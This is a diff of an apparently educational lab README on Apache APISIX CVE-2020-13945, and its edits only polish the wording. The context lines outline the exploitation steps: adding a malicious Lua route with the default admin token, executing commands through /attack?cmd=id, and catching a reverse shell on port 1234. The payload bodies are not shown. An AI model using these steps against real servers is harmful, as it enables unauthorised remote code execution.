@@ -1,4 +1,4 @@
-# Apache APISIX Default Key Remote Code Execution (CVE-2020-13945)
+# Apache APISIX Default API Key Remote Code Execution (CVE-2020-13945)
 
 > [中文文档](README.md)
 
@@ -28,7 +28,7 @@ After the environment starts, access `http://your-ip:9080` to see the default `4
 
 ## Vulnerability Exploitation
 
-Capture the request to `http://your-ip:9080` with **Burp Suite**, send it to the **Repeater** module, and use the default **Token** to add a malicious **router** containing a malicious **Lua** script:
+Capture a request to `http://your-ip:9080` with **Burp Suite**, send it to the **Repeater** module, and use the default **token** to add a malicious **router** containing a malicious **Lua** script:
 
 ```http
 POST /apisix/admin/routes HTTP/1.1
@@ -66,7 +66,7 @@ http://your-ip:9080/attack?cmd=id
 
 ## Reverse Shell
 
-Use the following **payload**, where ip is your **Kali** machine's IP, listening port is `1234`:
+Use the following **payload**, where IP is your **Kali** machine's IP address, and the listening port is `1234`:
 
 ```json
 {
@@ -83,7 +83,7 @@ Use the following **payload**, where ip is your **Kali** machine's IP, listening
 
 Modify the **payload**, then send it.
 
-Set up local listener on port `1234`:
+Set up a local listener on port `1234`:
 
 ```bash
 ┌──(root㉿nextcyber)-[~]
@@ -93,10 +93,10 @@ listening on [any] 1234 ...
 
 ![Reverse shell payload screenshot](https://static.nextcyber.cn/attachments/images/course/task/fc6c26e365154319a18ce60a80bffc77.png)
 
-Access `http://192.168.2.47:9080/shell` in browser:
+Access `http://192.168.2.47:9080/shell` in your browser:
 
 ![Reverse shell execution screenshot](https://static.nextcyber.cn/attachments/images/course/task/ce953141b6b3454e93797cd1b8a0a911.png)
 
 ![Reverse shell success screenshot](https://static.nextcyber.cn/attachments/images/course/task/df7b7922e5964235bf536ab5ce8837a9.png)
 
-As shown, the vulnerability was successfully exploited and a **reverse shell** was obtained from the target machine.
+As shown, the vulnerability was successfully exploited, and a **reverse shell** was obtained from the target machine.
